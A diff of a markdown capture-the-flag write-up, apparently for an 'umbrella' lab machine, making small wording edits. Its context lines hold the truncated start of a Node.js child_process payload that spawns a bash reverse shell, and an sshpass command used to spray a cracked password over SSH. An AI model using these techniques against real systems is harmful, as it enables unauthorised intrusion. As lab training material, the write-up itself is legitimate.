@@ -123,7 +123,7 @@ global.process.mainModule.require('child_process').spawn('bash',['-c','bash -i >
 
 ![reverse shell as root in container](../Screenshots/umbrella/reverse_shell.png)
 
-Shell landed as **root — but inside a container** (`root@de0610f51845`), not the host.
+Shell landed as **root but inside a container** (`root@de0610f51845`), not the host.
 
 Confirmed the root cause in the source once I was in.
 
@@ -145,7 +145,7 @@ The container passwords weren't reused for SSH as-is, so I sprayed each cracked 
 sshpass -p 'Password1' ssh claire-r@10.114.190.83 id
 ```
 
-Only **claire-r:Password1** worked (a nice bit of misdirection — she had the lowest time in the app but was the one with SSH). Logged in and grabbed the user flag from her home directory.
+Only **claire-r:Password1** worked. Logged in and grabbed the user flag from her home directory.
 
 ```bash
 ls -la
